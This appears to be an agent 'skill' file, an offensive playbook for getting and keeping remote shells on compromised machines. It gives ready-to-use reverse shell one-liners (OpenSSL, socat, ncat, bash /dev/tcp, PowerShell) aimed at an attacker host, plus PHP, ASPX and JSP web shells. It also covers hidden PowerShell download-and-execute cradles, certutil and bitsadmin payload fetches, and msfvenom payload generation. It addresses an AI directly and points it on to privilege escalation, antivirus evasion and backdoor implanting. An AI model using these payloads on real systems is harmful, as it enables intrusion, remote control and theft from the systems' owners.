---
name: reverse-shell-techniques
description: >-
  Reverse shell techniques playbook. Use when establishing remote shells including language one-liners, encrypted shells (OpenSSL/socat/ncat), web shells, PTY upgrades, file transfer methods, PowerShell shells, and Windows payload generation.
---

# SKILL: Reverse Shell Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert reverse shell techniques. Covers reverse/bind shell decisions, encrypted shells (OpenSSL, socat SSL, ncat), web shell patterns (PHP/ASPX/JSP), PTY upgrade sequences, file transfer methods, PowerShell download cradles, and msfvenom payload generation. Base models miss encrypted shell syntax, proper PTY stabilization, and platform-specific transfer techniques.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after shell access for network pivoting
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing shell
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV blocks shell payloads

### Quick Reference

Also load [SHELL_CHEATSHEET.md](./SHELL_CHEATSHEET.md) when you need:
- Complete one-liner reverse shells for 20+ languages
- Copy-paste ready payloads with placeholder substitution

---

## 1. REVERSE vs BIND SHELL DECISION

| Factor | Reverse Shell | Bind Shell |
|---|---|---|
| Firewall (egress) | Works if outbound allowed | Blocked by egress filtering |
| Firewall (ingress) | Not blocked | Requires inbound access to victim |
| NAT | Works (victim connects out) | Fails (can't reach victim behind NAT) |
| Detection | Outbound connection — less suspicious | Listening port — easily detected |
| Default choice | **Almost always preferred** | Only when no egress + have inbound |

---

## 2. ENCRYPTED SHELLS

### OpenSSL Reverse Shell

```bash
# Attacker: generate cert + listen
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/s; rm /tmp/s
```

### Socat Encrypted Shell

```bash
# Attacker: generate cert + listen
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT

# Victim:
socat OPENSSL:ATTACKER:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Ncat SSL

```bash
# Attacker:
ncat --ssl -lvnp 4444

# Victim:
ncat --ssl ATTACKER 4444 -e /bin/bash
```

---

## 3. WEB SHELLS

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

<!-- Minimal stealth shell -->
<?=`$_GET[0]`?>

<!-- POST-based with password -->
<?php if($_POST['k']==='SECRET'){system($_POST['cmd']);} ?>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start(new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>
```

### JSP

```jsp
<%@ page import="java.io.*" %>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null){out.println(l);} %>
```

### Upload + Trigger Patterns

```
1. Find upload endpoint → upload shell with allowed extension bypass
2. Locate uploaded file (predictable path, directory listing, response leak)
3. Trigger: GET /uploads/shell.php?cmd=id
4. Upgrade to reverse shell: ?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

---

## 4. PTY UPGRADE SEQUENCE

### Standard Python Upgrade

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background shell
# Press Ctrl+Z

# Step 3: Configure terminal (on attacker)
stty raw -echo; fg

# Step 4: Set environment (back in shell)
export TERM=xterm-256color
stty rows 40 cols 160
```

### Alternative Upgrades

```bash
# script command
script /dev/null -c bash

# socat full PTY (requires socat on victim)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444

# rlwrap for readline support (attacker side)
rlwrap nc -lvnp 4444

# expect
/usr/bin/expect -c 'spawn bash; interact'
```

---

## 5. FILE TRANSFER METHODS

### Linux

```bash
# wget / curl
wget http://ATTACKER:8000/file -O /tmp/file
curl http://ATTACKER:8000/file -o /tmp/file

# Python HTTP server (attacker side)
python3 -m http.server 8000

# nc file transfer
# Receiver:
nc -lvnp 9999 > file
# Sender:
nc RECEIVER 9999 < file

# base64 encode/decode (no tools needed)
# Encode on source:
base64 -w0 file
# Paste on target:
echo "BASE64_STRING" | base64 -d > file

# scp through pivot
scp -o ProxyJump=pivot user@target:/path/file ./local
```

### Windows

```powershell
# PowerShell DownloadFile
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\temp\file')

# PowerShell Invoke-WebRequest (PS 3.0+)
Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\temp\file
iwr http://ATTACKER/file -o C:\temp\file

# certutil
certutil -urlcache -f http://ATTACKER/file C:\temp\file

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\temp\file

# SMB share (attacker hosts)
# Attacker: impacket-smbserver share /tmp/share -smb2support
copy \\ATTACKER\share\file C:\temp\file
```

---

## 6. POWERSHELL REVERSE SHELLS

```powershell
# One-liner TCP reverse shell
$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()

# Download cradle + execute
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# Base64 encoded execution
$cmd = '...reverse shell code...'
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -ep bypass -enc $encoded
```

---

## 7. MSFVENOM PAYLOADS

```bash
# Linux reverse shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell

# Windows reverse shell (EXE)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter.exe

# Web payloads
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx

# DLL / HTA / VBS
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o evil.hta
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f vbs -o evil.vbs
```

---

## 8. DECISION TREE

```
Need remote shell on target
│
├── Can execute commands already (RCE)?
│   ├── Linux target?
│   │   ├── bash/python/perl available? → one-liner reverse shell (CHEATSHEET.md)
│   │   ├── Need encryption? → OpenSSL or socat SSL shell (§2)
│   │   └── Outbound blocked? → bind shell or tunnel (see tunneling-and-pivoting)
│   │
│   ├── Windows target?
│   │   ├── PowerShell available? → PS reverse shell (§6)
│   │   ├── Need binary? → msfvenom payload (§7)
│   │   └── AV blocking? → load windows-av-evasion skill
│   │
│   └── Web server (upload possible)?
│       ├── PHP? → PHP web shell (§3) → upgrade to reverse shell
│       ├── ASP.NET? → ASPX shell (§3)
│       └── Java/Tomcat? → JSP shell (§3)
│
├── Got a dumb shell?
│   ├── Python available? → PTY upgrade (§4)
│   ├── script available? → script /dev/null -c bash (§4)
│   ├── socat on target? → socat full PTY (§4)
│   └── None? → rlwrap on attacker side for readline
│
├── Need to transfer tools?
│   ├── Linux: wget/curl/nc/base64 (§5)
│   ├── Windows: certutil/PowerShell/bitsadmin/SMB (§5)
│   └── No outbound? → base64 copy-paste (§5)
│
└── Shell established — next steps?
    ├── Privilege escalation → load linux/windows-privilege-escalation
    ├── Pivot to internal network → load tunneling-and-pivoting
    └── Persistence → implant backdoor
```
